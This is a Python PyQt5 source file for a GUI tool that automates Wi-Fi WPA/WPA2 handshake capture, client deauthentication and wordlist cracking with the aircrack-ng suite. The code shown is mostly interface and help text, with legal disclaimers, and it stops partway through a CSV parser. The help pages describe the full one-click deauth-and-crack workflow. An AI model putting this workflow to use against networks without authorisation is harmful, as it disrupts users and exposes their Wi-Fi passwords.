#!/usr/bin/env python3
import sys
import os
import csv
import re
import subprocess
import threading
import time
import signal
from pathlib import Path
from datetime import datetime
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QGridLayout, QGroupBox, QPushButton, QLabel, QComboBox, QLineEdit,
    QTableWidget, QTableWidgetItem, QTextEdit, QStatusBar, QMessageBox,
    QSpinBox, QHeaderView, QCheckBox, QTabWidget, QDialog, QFileDialog,
    QMenuBar, QMenu, QAction, QScrollArea, QToolTip, QShortcut,
    QButtonGroup, QTextBrowser, QSplashScreen, QProgressBar, QFrame,
)
from PyQt5.QtCore import (
    QTimer, Qt, QCoreApplication, pyqtSignal, QThread, QPropertyAnimation,
    QEasingCurve, QRect, QPoint, QSize,
)
from PyQt5.QtGui import (
    QCloseEvent, QKeySequence, QCursor, QPixmap, QPainter, QColor,
    QFont, QLinearGradient, QBrush, QPen, QFontDatabase, QIcon,
    QRadialGradient,
)
APP_NAME = "Black Turbans Of Salam"
APP_TAGLINE = "Unity · Respect · Strength"
APP_VERSION = "2.0 — Professional Edition"

DEFAULT_WORDLIST = "/usr/share/wordlists/rockyou.txt"
WELCOME_FLAG = Path.home() / ".bts_welcome_shown"
LOGO_PATH    = Path(__file__).parent / "logo.png"
GOLD         = "#d4af37"
GOLD_BRIGHT  = "#f0d774"
GOLD_DEEP    = "#8b6f1f"
BLACK_DEEP   = "#0a0a0a"
BLACK_PANEL  = "#141414"
BLACK_INPUT  = "#1c1c1c"
GRAY_BORDER  = "#2e2a1f"
TEXT         = "#e8e6df"
TEXT_MUTED   = "#8a8578"
SUCCESS      = "#4ee07a"
DANGER       = "#e74c3c"
WARNING      = "#f39c12"
INFO         = "#569cd6"
HELP_HTML = {
"overview": f"""
<h2 style="color:{GOLD};">📖 Black Turbans of Salam — Overview</h2>
<p style="color:{TEXT};">This tool is a <b>fully automated Wi-Fi security
testing utility</b> for Linux. It walks through the standard WPA/WPA2
handshake-capture workflow that a security professional or student would
perform on a network they are <b>authorized to test</b>.</p>
<h3 style="color:{GOLD};">🎯 Purpose</h3>
<ul style="color:{TEXT};">
  <li><b>Learn how Wi-Fi WPA/WPA2 handshakes are captured.</b></li>
  <li><b>Practice password auditing</b> on your own test networks.</li>
  <li><b>Demonstrate the importance of strong passphrases.</b></li>
  <li><b>Verify that a given network is vulnerable</b> to offline dictionary attacks.</li>
</ul>
<h3 style="color:{DANGER};">⚠ Legal &amp; Ethical Notice</h3>
<p style="color:{DANGER};"><b>Only use this tool on networks you own or have
explicit written permission to test.</b> Capturing handshakes and performing
deauthentication attacks on networks you do not own is illegal in most
countries and can result in criminal prosecution.</p>
<h3 style="color:{GOLD};">🤖 Fully Automated Workflow</h3>
<p style="color:{TEXT};">The tool performs the entire pipeline with
<b>only ONE click of yours</b> (to select the target network):</p>
<ol style="color:{TEXT};">
  <li><b>Check kill</b> — stops NetworkManager / wpa_supplicant.</li>
  <li><b>Monitor mode</b> — puts your wireless card into monitor mode.</li>
  <li><b>Real-time scan</b> — runs <code>airodump-ng</code> for up to 30 seconds.</li>
  <li><b>You click</b> the target network row — <i>the only manual step</i>.</li>
  <li><b>Targeted capture</b> — locks onto that network.</li>
  <li><b>Auto station discovery</b> — finds a client MAC connected to the target.</li>
  <li><b>Deauth ×3</b> — forces a handshake.</li>
  <li><b>Auto crack</b> — runs <code>aircrack-ng</code> with your chosen wordlist.</li>
  <li><b>Auto stop</b> — all background processes are terminated cleanly.</li>
</ol>
""",
"quickstart": f"""
<h2 style="color:{GOLD};">🚀 Quick Start (3 Steps)</h2>

<h3 style="color:{GOLD};">Step 1 — Prepare the tool</h3>
<ol style="color:{TEXT};">
  <li>Install required tools:
      <pre style="color:{GOLD};">sudo apt install aircrack-ng iw wireless-tools</pre></li>
  <li>Run with <b>root privileges</b>:
      <pre style="color:{GOLD};">sudo python3 main.py</pre></li>
  <li>Plug in your <b>wireless adapter</b> (one that supports monitor mode).</li>
</ol>
<h3 style="color:{GOLD};">Step 2 — One-click start</h3>
<ol style="color:{TEXT};">
  <li>Click <b>🔄 Detect</b> to find your wireless interface.</li>
  <li>Select your interface from the dropdown.</li>
  <li>Optionally: click <b>📂 Browse</b> to choose a different wordlist.</li>
  <li>Click <b>🚀 Start Fully Automated Workflow</b>.</li>
</ol>
<h3 style="color:{GOLD};">Step 3 — Pick your target</h3>
<ol style="color:{TEXT};">
  <li>Wait a few seconds. Networks appear in the table.</li>
  <li>When the status says <b>🎯 Click a target row to proceed</b>,
      click any row in the Networks table.</li>
  <li>Sit back. The tool does everything else.</li>
  <li>Read the result in the status bar and log.</li>
</ol>
<p style="color:{SUCCESS};"><b>That's it!</b> The only thing you do manually
is pick which network you want to test.</p>
""",
"phases": f"""
<h2 style="color:{GOLD};">📊 Understanding the Phases</h2>
<p style="color:{TEXT};">The status bar shows which phase the tool is in:</p>

<table border="1" cellpadding="8" style="border-collapse:collapse; color:{TEXT};">
  <tr style="background:{BLACK_PANEL}; color:{GOLD};">
    <th>Phase</th><th>What's happening</th><th>What you do</th>
  </tr>
  <tr><td><b>⚪ Idle</b></td><td>Nothing running.</td><td>Click <b>Start</b>.</td></tr>
  <tr><td><b>🛠 Preparing</b></td><td>check kill + monitor mode.</td><td>Wait.</td></tr>
  <tr><td><b>🚀 Scanning</b></td><td>Scanning networks.</td><td>Watch the table.</td></tr>
  <tr><td><b>🎯 Select target</b></td><td>Scan finished.</td><td><b>Click a row.</b></td></tr>
  <tr><td><b>🎣 Capture</b></td><td>Targeted capture running.</td><td>Wait.</td></tr>
  <tr><td><b>🔨 Deauth</b></td><td>Forcing reconnect.</td><td>Wait.</td></tr>
  <tr><td><b>🔑 Cracking</b></td><td>Wordlist attack.</td><td>Wait.</td></tr>
  <tr><td><b>✅ Complete</b></td><td>All done.</td><td>Read the result.</td></tr>
</table>
""",
"results": f"""
<h2 style="color:{GOLD};">🔑 Reading Your Results</h2>
<h3 style="color:{SUCCESS};">✅ KEY FOUND</h3>
<pre style="color:{SUCCESS};">[+] KEY FOUND: [ mypassword123 ]</pre>
<p style="color:{TEXT};">The password is inside the brackets. Weak passphrase
— should be changed.</p>
<h3 style="color:{DANGER};">❌ Passphrase not in wordlist</h3>
<pre style="color:{DANGER};">[!] Passphrase not in wordlist.</pre>
<p style="color:{TEXT};">Handshake captured but password not in your list.
Either the password is strong, or you need a bigger wordlist.</p>

<h3 style="color:{WARNING};">⚠ No handshake</h3>
<pre style="color:{WARNING};">[!] No EAPOL data — no handshake captured.</pre>
<p style="color:{TEXT};">Try: moving closer, waiting for a client to connect,
increasing deauth rounds, or increasing deauth count.</p>

<h3 style="color:{GOLD};">📁 File locations</h3>
<ul style="color:{TEXT};">
  <li><code>/tmp/wifi_gui_&lt;timestamp&gt;/scan-01.csv</code> — scan</li>
  <li><code>/tmp/handshake_&lt;timestamp&gt;/&lt;name&gt;-01.cap</code> — handshake</li>
  <li><code>/tmp/handshake_&lt;timestamp&gt;/&lt;name&gt;-01.csv</code> — clients</li>
</ul>
""",
"settings": f"""
<h2 style="color:{GOLD};">⚙️ Settings Explained</h2>
<h3 style="color:{GOLD};">Scan timeout (seconds)</h3>
<p style="color:{TEXT};">Max scan time. Default: <b>30</b>. Stops early if
enough networks found.</p>
<h3 style="color:{GOLD};">Min networks to stop scan</h3>
<p style="color:{TEXT};">Once this many networks are visible, stop early.
Default: <b>3</b>.</p>
<h3 style="color:{GOLD};">Deauth count / round</h3>
<p style="color:{TEXT};">Frames per round. Default: <b>3</b>.</p>
<h3 style="color:{GOLD};">Deauth rounds</h3>
<p style="color:{TEXT};">How many bursts. Default: <b>3</b>.</p>
<h3 style="color:{GOLD};">Wordlist</h3>
<p style="color:{TEXT};">Passwords to try. Default:
<code>{DEFAULT_WORDLIST}</code></p>
""",
"troubleshooting": f"""
<h2 style="color:{GOLD};">🔧 Troubleshooting</h2>
<h3 style="color:{GOLD};">Monitor mode won't start</h3>
<ul style="color:{TEXT};">
  <li>Close other Wi-Fi tools (Wireshark, Kismet).</li>
  <li>Replug USB adapters.</li>
  <li>Not all laptop cards support monitor mode — try an Alfa adapter.</li>
  <li>Ensure aircrack-ng is installed.</li>
</ul>
<h3 style="color:{GOLD};">No networks found</h3>
<ul style="color:{TEXT};">
  <li>Move closer to access points.</li>
  <li>Confirm "🟢 Monitor active" in the status.</li>
  <li>Increase scan timeout.</li>
</ul>
<h3 style="color:{GOLD};">No station MAC discovered</h3>
<ul style="color:{TEXT};">
  <li>No client currently connected, or client is idle.</li>
  <li>Move closer to the AP.</li>
</ul>
<h3 style="color:{GOLD};">Install aircrack-ng</h3>
<pre style="color:{GOLD};">sudo apt install aircrack-ng</pre>

<h3 style="color:{GOLD};">Find your interface name</h3>
<pre style="color:{GOLD};">iwconfig</pre>
""",
"legal": f"""
<h2 style="color:{DANGER};">⚖️ Legal &amp; Ethical Use</h2>

<div style="background:#2a0f0f; padding:16px; border-left:4px solid {DANGER};">
<p style="color:{DANGER}; font-weight:bold;">This tool performs active Wi-Fi
attacks. Unauthorized use is a crime.</p>
</div>
<h3 style="color:{SUCCESS};">✅ You MAY use this tool to:</h3>
<ul style="color:{TEXT};">
  <li>Test <b>your own</b> wireless networks.</li>
  <li>Test networks with <b>written permission</b>.</li>
  <li>Practice in a <b>lab environment</b>.</li>
  <li>Learn in a classroom or CTF.</li>
</ul>

<h3 style="color:{DANGER};">❌ You MAY NOT:</h3>
<ul style="color:{TEXT};">
  <li>Attack neighbors' Wi-Fi.</li>
  <li>Attack public hotspots.</li>
  <li>Attack employer networks without authorization.</li>
  <li>Steal passwords.</li>
  <li>Disrupt anyone else's network.</li>
</ul>

<p style="color:{GOLD};"><b>{APP_TAGLINE}</b></p>
""",
}
class BTSSplashScreen(QSplashScreen):
    """Adventure-style animated splash with branded intro."""
    INTRO_LINES = [
        "⚔  Initializing Black Turbans of Salam…",
        "🛡  Loading encryption engine…",
        "🗡  Preparing wireless toolkit…",
        "🔥  Calibrating monitor mode modules…",
        "👑  Ready for the mission.",
    ]
    def __init__(self):
        self.W, self.H = 640, 400
        pix = QPixmap(self.W, self.H)
        pix.fill(Qt.transparent)
        super().__init__(pix)
        self.setWindowFlag(Qt.FramelessWindowHint)
        self.setAttribute(Qt.WA_TranslucentBackground)
        self._progress = 0
        self._line_index = 0
        self._logo_pix = self._load_logo()
        self._timer = QTimer(self)
        self._timer.timeout.connect(self._tick)
        self._timer.start(60)
        self._elapsed = 0
    def _load_logo(self):
        if LOGO_PATH.exists():
            try:
                p = QPixmap(str(LOGO_PATH))
                if not p.isNull():
                    return p.scaled(180, 180, Qt.KeepAspectRatio,
                                    Qt.SmoothTransformation)
            except Exception:
                pass
        return self._draw_logo_svg()
    def _draw_logo_svg(self):
        size = 180
        pm = QPixmap(size, size)
        pm.fill(Qt.transparent)
        p = QPainter(pm)
        p.setRenderHint(QPainter.Antialiasing)
        pen = QPen(QColor(GOLD), 2)
        p.setPen(pen)
        p.setBrush(Qt.NoBrush)
        p.drawEllipse(8, 8, size - 16, size - 16)
        p.setBrush(QBrush(QColor("#1a7a35")))
        p.setPen(QPen(QColor(GOLD_DEEP), 1.5))
        p.drawEllipse(45, 30, 90, 70)
        p.setBrush(QBrush(QColor("#f4f6f8")))
        p.setPen(QPen(QColor(GOLD_DEEP), 1.5))
        p.drawRoundedRect(25, 90, 130, 55, 25, 25)
        p.end()
        return pm
    def drawContents(self, painter):
        painter.setRenderHint(QPainter.Antialiasing)
        grad = QLinearGradient(0, 0, 0, self.H)
        grad.setColorAt(0, QColor("#0a0a0a"))
        grad.setColorAt(1, QColor("#1a1408"))
        painter.fillRect(0, 0, self.W, self.H, QBrush(grad))
        painter.setPen(QPen(QColor(GOLD), 2))
        painter.drawRect(2, 2, self.W - 4, self.H - 4)
        painter.setPen(QPen(QColor(GOLD_DEEP), 1))
        painter.drawRect(8, 8, self.W - 16, self.H - 16)
        rg = QRadialGradient(self.W // 2, 130, 160)
        rg.setColorAt(0, QColor(212, 175, 55, 90))
        rg.setColorAt(1, QColor(212, 175, 55, 0))
        painter.fillRect(0, 0, self.W, 260, QBrush(rg))
        if not self._logo_pix.isNull():
            lx = (self.W - self._logo_pix.width()) // 2
            painter.drawPixmap(lx, 35, self._logo_pix)
        f = QFont("Georgia", 22, QFont.Bold)
        painter.setFont(f)
        painter.setPen(QColor(GOLD_BRIGHT))
        painter.drawText(QRect(0, 215, self.W, 40),
                         Qt.AlignCenter, APP_NAME.upper())
        f2 = QFont("Georgia", 10)
        f2.setItalic(True)
        painter.setFont(f2)
        painter.setPen(QColor(GOLD))
        painter.drawText(QRect(0, 252, self.W, 25),
                         Qt.AlignCenter, f"· {APP_TAGLINE} ·")
        bar_x, bar_y, bar_w, bar_h = 80, 310, self.W - 160, 6
        painter.setPen(Qt.NoPen)
        painter.setBrush(QColor(GRAY_BORDER))
        painter.drawRoundedRect(bar_x, bar_y, bar_w, bar_h, 3, 3)
        fill_w = int(bar_w * (self._progress / 100.0))
        grad2 = QLinearGradient(bar_x, 0, bar_x + fill_w, 0)
        grad2.setColorAt(0, QColor(GOLD_DEEP))
        grad2.setColorAt(1, QColor(GOLD_BRIGHT))
        painter.setBrush(QBrush(grad2))
        painter.drawRoundedRect(bar_x, bar_y, fill_w, bar_h, 3, 3)
        f3 = QFont("Consolas", 9)
        painter.setFont(f3)
        painter.setPen(QColor(TEXT))
        line = self.INTRO_LINES[min(self._line_index,
                                    len(self.INTRO_LINES) - 1)]
        painter.drawText(QRect(0, 330, self.W, 25),
                         Qt.AlignCenter, line)
        painter.setPen(QColor(GOLD))
        f4 = QFont("Consolas", 8)
        painter.setFont(f4)
        painter.drawText(QRect(0, 355, self.W, 20),
                         Qt.AlignCenter, f"{self._progress}%")
        painter.setPen(QColor(TEXT_MUTED))
        f5 = QFont("Consolas", 7)
        painter.setFont(f5)
        painter.drawText(QRect(0, 375, self.W, 20),
                         Qt.AlignRight | Qt.AlignVCenter, APP_VERSION + "  ")

    def _tick(self):
        self._elapsed += 60
        self._progress = min(100, int((self._elapsed / 2400.0) * 100))
        idx = min(len(self.INTRO_LINES) - 1,
                  int(self._progress / (100.0 / len(self.INTRO_LINES))))
        self._line_index = idx
        self.repaint()
        if self._progress >= 100:
            self._timer.stop()
class HelpDialog(QDialog):
    TOPICS = [
        ("overview",       "📖 Overview & Purpose"),
        ("quickstart",     "🚀 Quick Start"),
        ("phases",         "📊 Understanding Phases"),
        ("results",        "🔑 Reading Results"),
        ("settings",       "⚙️ Settings Explained"),
        ("troubleshooting","🔧 Troubleshooting"),
        ("legal",          "⚖️ Legal & Ethics"),
    ]

    def __init__(self, initial_topic="overview", parent=None):
        super().__init__(parent)
        self.setWindowTitle(f"Help — {APP_NAME}")
        self.resize(980, 720)
        self.setStyleSheet(f"""
            QDialog {{ background-color: {BLACK_PANEL}; }}
            QLabel {{ color: {TEXT}; }}
            QPushButton {{
                background-color: {BLACK_INPUT}; color: {TEXT};
                border: 1px solid {GRAY_BORDER}; padding: 6px 12px;
                border-radius: 3px; font-weight: bold;
            }}
            QPushButton:hover {{
                background-color: {GOLD_DEEP}; color: {BLACK_DEEP};
            }}
            QPushButton#topic {{
                background-color: {BLACK_PANEL}; color: {TEXT};
                text-align: left; padding: 12px 16px;
                border: none; border-left: 3px solid transparent;
                font-weight: normal;
            }}
            QPushButton#topic:hover {{
                background-color: {BLACK_INPUT};
                border-left: 3px solid {GOLD_DEEP};
                color: {GOLD_BRIGHT};
            }}
            QPushButton#topic:checked {{
                background-color: {BLACK_INPUT};
                border-left: 3px solid {GOLD_BRIGHT};
                color: {GOLD_BRIGHT};
                font-weight: bold;
            }}
            QTextBrowser {{
                background-color: {BLACK_PANEL}; color: {TEXT};
                border: none;
                font-family: "Segoe UI", "Ubuntu", sans-serif;
                font-size: 11pt;
                padding: 16px;
            }}
        """)
        root = QHBoxLayout(self)
        root.setContentsMargins(0, 0, 0, 0)
        root.setSpacing(0)
        sidebar = QWidget()
        sidebar.setFixedWidth(250)
        sidebar.setStyleSheet(f"background-color: {BLACK_PANEL};")
        s_layout = QVBoxLayout(sidebar)
        s_layout.setContentsMargins(0, 0, 0, 0)
        head = QLabel(f"👑 {APP_NAME}")
        head.setStyleSheet(f"""
            color: {GOLD_BRIGHT}; font-size: 12pt; font-weight: bold;
            padding: 18px 16px; background-color: {BLACK_DEEP};
            border-bottom: 1px solid {GRAY_BORDER};
        """)
        s_layout.addWidget(head)
        self._topic_buttons = {}
        self._group = QButtonGroup(self)
        self._group.setExclusive(True)
        for key, label in self.TOPICS:
            btn = QPushButton(label)
            btn.setObjectName("topic")
            btn.setCheckable(True)
            btn.setCursor(Qt.PointingHandCursor)
            btn.clicked.connect(lambda _, k=key: self.show_topic(k))
            self._group.addButton(btn)
            self._topic_buttons[key] = btn
            s_layout.addWidget(btn)
        s_layout.addStretch()
        close_btn = QPushButton("✖ Close Help")
        close_btn.clicked.connect(self.close)
        s_layout.addWidget(close_btn)
        s_layout.setContentsMargins(0, 0, 0, 8)

        root.addWidget(sidebar)

        self.content = QTextBrowser()
        self.content.setReadOnly(True)
        self.content.setOpenExternalLinks(True)
        root.addWidget(self.content, stretch=1)
        self.show_topic(initial_topic)
    def show_topic(self, key):
        html = HELP_HTML.get(key, "<p>Topic not found.</p>")
        full = f"""
        <html><body style="background:{BLACK_PANEL}; color:{TEXT};
                           font-family:'Segoe UI',sans-serif;">
        {html}
        <hr style="border:none; border-top:1px solid {GRAY_BORDER};
                   margin-top:24px;">
        <p style="color:{TEXT_MUTED}; font-size:9pt; text-align:center;">
        {APP_NAME} · {APP_TAGLINE} · {APP_VERSION}
        </p>
        </body></html>
        """
        self.content.setHtml(full)
        self.content.verticalScrollBar().setValue(0)
        btn = self._topic_buttons.get(key)
        if btn: btn.setChecked(True)
class WelcomeDialog(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle(f"Welcome — {APP_NAME}")
        self.resize(780, 600)
        self.setStyleSheet(f"""
            QDialog {{ background-color: {BLACK_PANEL}; }}
            QLabel {{ color: {TEXT}; }}
            QPushButton {{
                background-color: {BLACK_INPUT}; color: {TEXT};
                border: 1px solid {GRAY_BORDER};
                padding: 8px 16px; border-radius: 4px;
                font-weight: bold; font-size: 11pt;
            }}
            QPushButton:hover {{
                background-color: {GOLD_DEEP}; color: {BLACK_DEEP};
                border: 1px solid {GOLD};
            }}
            QPushButton#primary {{
                background-color: {GOLD}; color: {BLACK_DEEP};
                border: none;
            }}
            QPushButton#primary:hover {{
                background-color: {GOLD_BRIGHT};
            }}
            QTextBrowser {{
                background-color: {BLACK_DEEP}; color: {TEXT};
                border: 1px solid {GRAY_BORDER};
                border-radius: 4px;
                font-size: 10.5pt; padding: 16px;
            }}
            QCheckBox {{ color: {TEXT}; }}
        """)
        layout = QVBoxLayout(self)

        head = QHBoxLayout()
        logo_lbl = QLabel()
        if LOGO_PATH.exists():
            pix = QPixmap(str(LOGO_PATH))
            if not pix.isNull():
                logo_lbl.setPixmap(pix.scaled(80, 80, Qt.KeepAspectRatio,
                                              Qt.SmoothTransformation))
        head.addWidget(logo_lbl)
        title_col = QVBoxLayout()
        title = QLabel(f"👑 {APP_NAME}")
        title.setStyleSheet(
            f"color:{GOLD_BRIGHT}; font-size:18pt; font-weight:bold;"
            "font-family:'Georgia',serif;")
        title_col.addWidget(title)
        tag = QLabel(APP_TAGLINE)
        tag.setStyleSheet(
            f"color:{GOLD}; font-size:11pt; font-style:italic;")
        title_col.addWidget(tag)
        head.addLayout(title_col)
        head.addStretch()
        layout.addLayout(head)
        line = QFrame()
        line.setFrameShape(QFrame.HLine)
        line.setStyleSheet(f"background:{GRAY_BORDER}; max-height:1px;")
        layout.addWidget(line)
        body = QTextBrowser()
        body.setReadOnly(True)
        body.setOpenExternalLinks(True)
        body.setHtml(f"""
        <h3 style="color:{GOLD};">Welcome, warrior. 🛡️</h3>
        <p style="color:{TEXT};">You are about to use a fully automated
        Wi-Fi security audit tool. It handles the entire WPA/WPA2 handshake
        capture workflow end-to-end.</p>
        <h3 style="color:{GOLD};">What this tool does</h3>
        <ol style="color:{TEXT};">
          <li><b>Scan</b> for nearby Wi-Fi networks (≤30 seconds).</li>
          <li><b>You pick</b> one target — your only manual step.</li>
          <li><b>Capture</b> the WPA handshake automatically.</li>
          <li><b>Deauth</b> connected clients (×3 rounds).</li>
          <li><b>Crack</b> the captured handshake with a wordlist.</li>
        </ol>
        <h3 style="color:{GOLD};">How to use it</h3>
        <ol style="color:{TEXT};">
          <li>Plug in your wireless adapter.</li>
          <li>Click <b>🔄 Detect</b> to find your interface.</li>
          <li>Optionally pick a wordlist (default: rockyou.txt).</li>
          <li>Click <b>🚀 Start Fully Automated Workflow</b>.</li>
          <li>When networks appear, <b>click a target row</b>.</li>
          <li>Wait — the tool does the rest.</li>
        </ol>
        <h3 style="color:{DANGER};">⚠ Legal Notice</h3>
        <p style="color:{DANGER};"><b>Only use on networks you own or have
        written permission to test.</b> Unauthorized Wi-Fi attacks are illegal.
        The authors assume no responsibility for misuse.</p>
        <p style="color:{TEXT_MUTED}; font-size:9pt;">
        {APP_TAGLINE} · Press F1 in the main window for the full help system.
        </p>
        """)
        layout.addWidget(body, stretch=1)
        footer = QHBoxLayout()
        self.dont_show = QCheckBox("Don't show this again")
        self.dont_show.setStyleSheet(f"color:{TEXT};")
        footer.addWidget(self.dont_show)
        footer.addStretch()
        help_btn = QPushButton("📚 Open Full Help")
        help_btn.clicked.connect(self._open_full_help)
        footer.addWidget(help_btn)
        ok_btn = QPushButton("⚔  Begin Mission")
        ok_btn.setObjectName("primary")
        ok_btn.clicked.connect(self.accept)
        footer.addWidget(ok_btn)
        layout.addLayout(footer)
    def _open_full_help(self):
        dlg = HelpDialog(initial_topic="quickstart", parent=self)
        dlg.exec_()
class CommandRunner:
    def __init__(self, name, log_callback, output_callback=None,
                 log_to_panel=True):
        self.name = name
        self.log = log_callback
        self.output_callback = output_callback
        self.log_to_panel = log_to_panel
        self.process = None
        self.running = False
        self.thread = None
        self.stop_flag = False
        self.process_group_id = None
        self.output_lines = []
        self._lock = threading.Lock()
    def is_running(self):
        with self._lock:
            return bool(self.running)
    def start(self, cmd, output_prefix=None):
        if self.is_running():
            self.log(f"[!] {self.name} is already running.")
            return False
        self.stop_flag = False
        self.output_lines = []
        with self._lock:
            self.running = True
        def worker():
            proc = None
            try:
                self.log(f"[*] {self.name} started...")
                popen_kwargs = dict(
                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                    stdin=subprocess.DEVNULL, text=True, encoding="utf-8",
                    errors="replace", bufsize=1, env=os.environ.copy())
                try:
                    proc = subprocess.Popen(cmd, start_new_session=True,
                                            **popen_kwargs)
                except (OSError, subprocess.SubprocessError) as e:
                    self.log(f"[!] {self.name}: retry without session ({e})")
                    proc = subprocess.Popen(cmd, start_new_session=False,
                                            **popen_kwargs)
                self.process = proc
                try:
                    if hasattr(os, "getpgid") and proc.pid:
                        self.process_group_id = os.getpgid(proc.pid)
                except Exception:
                    self.process_group_id = None
                self.log(f"[+] {self.name} PID: {proc.pid}")

                if proc.stdout is not None:
                    try:
                        for line in iter(proc.stdout.readline, ""):
                            if self.stop_flag: break
                            if not line: continue
                            clean = line.rstrip("\r\n")
                            self.output_lines.append(clean)
                            if self.output_callback:
                                try: self.output_callback(clean)
                                except Exception: pass
                            if self.log_to_panel and output_prefix:
                                self.log(f"{output_prefix} {clean}")
                    finally:
                        try: proc.stdout.close()
                        except Exception: pass

                if proc.poll() is None:
                    if self.stop_flag: self._terminate_process()
                    else:
                        try: proc.wait(timeout=2)
                        except subprocess.TimeoutExpired:
                            self._terminate_process()
                rc = proc.poll()
                self.log(f"[*] {self.name} finished (exit code: {rc})")
            except FileNotFoundError as e:
                self.log(f"[!] {self.name} command not found: {e}")
            except PermissionError as e:
                self.log(f"[!] {self.name} permission denied: {e}")
            except Exception as e:
                self.log(f"[!] {self.name} error: {e}")
            finally:
                with self._lock:
                    self.running = False
                self.process = None
                self.process_group_id = None
        self.thread = threading.Thread(target=worker,
                                       name=f"runner-{self.name}", daemon=True)
        self.thread.start()
        return True
    def _terminate_process(self):
        proc = self.process
        if proc is None: return
        if self.process_group_id is not None and hasattr(os, "killpg"):
            try:
                os.killpg(self.process_group_id, signal.SIGTERM)
                try: proc.wait(timeout=2); return
                except subprocess.TimeoutExpired: pass
            except Exception: pass
            try:
                os.killpg(self.process_group_id, signal.SIGKILL); return
            except Exception: pass
        try:
            proc.terminate(); proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            try: proc.kill(); proc.wait(timeout=2)
            except Exception: pass
        except Exception: pass
    def stop(self):
        if not self.is_running(): return
        self.log(f"[*] Stopping {self.name}...")
        self.stop_flag = True
        self._terminate_process()
class CsvViewerDialog(QDialog):
    def __init__(self, csv_path, parent=None):
        super().__init__(parent)
        self.csv_path = Path(csv_path)
        self.setWindowTitle(f"CSV Viewer — {self.csv_path.name}")
        self.resize(1150, 720)
        self.setStyleSheet(f"""
            QDialog {{ background-color: {BLACK_PANEL}; }}
            QLabel {{ color: {TEXT}; }}
            QPushButton {{
                background-color: {BLACK_INPUT}; color: {TEXT};
                border: 1px solid {GRAY_BORDER}; padding: 6px 12px;
                border-radius: 3px; font-weight: bold;
            }}
            QPushButton:hover {{
                background-color: {GOLD_DEEP}; color: {BLACK_DEEP};
                border: 1px solid {GOLD};
            }}
            QTableWidget {{
                background-color: {BLACK_DEEP}; color: {TEXT};
                gridline-color: {GRAY_BORDER};
                selection-background-color: {GOLD_DEEP};
                alternate-background-color: {BLACK_PANEL};
                border: 1px solid {GRAY_BORDER};
            }}
            QHeaderView::section {{
                background-color: {BLACK_PANEL}; color: {GOLD};
                padding: 8px; border: 1px solid {GRAY_BORDER};
                font-weight: bold;
            }}
            QTextEdit {{
                background-color: {BLACK_DEEP}; color: {TEXT};
                border: 1px solid {GRAY_BORDER};
                font-family: "Consolas", "Courier New"; font-size: 9pt;
            }}
            QCheckBox {{ color: {TEXT}; }}
            QTabWidget::pane {{ border: 1px solid {GRAY_BORDER};
                               background: {BLACK_PANEL}; }}
            QTabBar::tab {{
                background: {BLACK_INPUT}; color: {TEXT};
                padding: 8px 16px; border: 1px solid {GRAY_BORDER};
            }}
            QTabBar::tab:selected {{
                background: {BLACK_DEEP}; color: {GOLD_BRIGHT};
                border-bottom: 2px solid {GOLD};
            }}
        """)
        layout = QVBoxLayout(self)
        info = QHBoxLayout()
        lbl = QLabel(f"📁 {self.csv_path}")
        lbl.setStyleSheet(f"color:{GOLD}; font-family:'Consolas';")
        info.addWidget(lbl); info.addStretch()
        rbtn = QPushButton("🔄 Refresh"); rbtn.clicked.connect(self.load_csv)
        info.addWidget(rbtn)
        cbtn = QPushButton("📋 Copy Path"); cbtn.clicked.connect(self.copy_path)
        info.addWidget(cbtn)
        xbtn = QPushButton("✖ Close"); xbtn.clicked.connect(self.close)
        info.addWidget(xbtn)
        layout.addLayout(info)
        self.tabs = QTabWidget()
        ap_w = QWidget(); ap_l = QVBoxLayout(ap_w)
        self.ap_table = QTableWidget()
        self.ap_table.setAlternatingRowColors(True)
        self.ap_table.setSelectionBehavior(QTableWidget.SelectRows)
        ap_l.addWidget(self.ap_table); self.tabs.addTab(ap_w, "APs (Networks)")
        sta_w = QWidget(); sta_l = QVBoxLayout(sta_w)
        self.sta_table = QTableWidget()
        self.sta_table.setAlternatingRowColors(True)
        self.sta_table.setSelectionBehavior(QTableWidget.SelectRows)
        sta_l.addWidget(self.sta_table); self.tabs.addTab(sta_w, "Stations (Clients)")
        raw_w = QWidget(); raw_l = QVBoxLayout(raw_w)
        self.raw_view = QTextEdit(); self.raw_view.setReadOnly(True)
        raw_l.addWidget(self.raw_view); self.tabs.addTab(raw_w, "Raw CSV")
        layout.addWidget(self.tabs)
        bot = QHBoxLayout()
        self.status_label = QLabel("Ready")
        self.status_label.setStyleSheet(f"color:{SUCCESS};")
        bot.addWidget(self.status_label); bot.addStretch()
        self.auto_refresh_check = QCheckBox("Auto-refresh (2s)")
        self.auto_refresh_check.setStyleSheet(f"color:{TEXT};")
        self.auto_refresh_check.stateChanged.connect(self.toggle_auto_refresh)
        bot.addWidget(self.auto_refresh_check)
        layout.addLayout(bot)
        self.refresh_timer = QTimer(self)
        self.refresh_timer.timeout.connect(self.load_csv)
        self.load_csv()
    def toggle_auto_refresh(self, state):
        if state == Qt.Checked: self.refresh_timer.start(2000)
        else: self.refresh_timer.stop()
    def copy_path(self):
        QApplication.clipboard().setText(str(self.csv_path))
        self.status_label.setText("📋 Path copied")
        self.status_label.setStyleSheet(f"color:{SUCCESS};")
    def load_csv(self):
        if not self.csv_path.exists():
            self.status_label.setText(f"[!] File not found")
            self.status_label.setStyleSheet(f"color:{DANGER};"); return
        try:
            with open(self.csv_path, "r", encoding="utf-8",
                      errors="replace", newline="") as f:
                content = f.read()
        except Exception as e:
            self.status_label.setText(f"[!] Read error: {e}")
            self.status_label.setStyleSheet(f"color:{DANGER};"); return
        ap_rows, sta_rows, ap_h, sta_h, section = [], [], [], [], None
        for line in content.splitlines():
            if not line.strip(): continue
            try: row = next(csv.reader([line]))
            except Exception: continue
            first = row[0].strip() if row else ""
            if first == "BSSID":
                section = "AP"; ap_h = [c.strip() for c in row]; continue
            if first == "Station MAC":
                section = "STA"; sta_h = [c.strip() for c in row]; continue
            if section == "AP" and first: ap_rows.append(row)
            elif section == "STA" and first: sta_rows.append(row)
        self._populate_table(self.ap_table, ap_h, ap_rows,
            default_headers=["BSSID","First seen","Last seen","channel","Speed",
                "Privacy","Cipher","Authentication","Power","# beacons",
                "# IV","LAN IP","ID-length","ESSID","Key"])
